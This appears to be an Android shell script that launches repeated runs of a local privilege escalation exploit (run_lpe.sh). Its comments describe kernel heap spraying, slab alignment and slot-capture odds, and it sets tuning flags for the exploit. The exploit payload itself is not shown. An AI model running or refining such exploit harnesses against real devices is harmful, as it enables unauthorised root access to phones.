#!/system/bin/sh
# run12: aligned padding + early spray, 8 attempts.  Run11 proved the capture
# on the phone (one genuine node at slot 11), but only slots 0..6 have a
# generated mcast case, so the node slot is a 7/31 lottery per attempt.
# Parked attempts hold their psl sockets until reboot and must not be killed.
cd /data/local/tmp || exit 1
rm -f ic-run12.log
IC_SLABTRACE=1 IC_PAD_ALIGN=1 IC_SPRAY_EARLY=1 \
IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 \
  ATTEMPTS=8 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run12.log 2>&1 &
exit 0
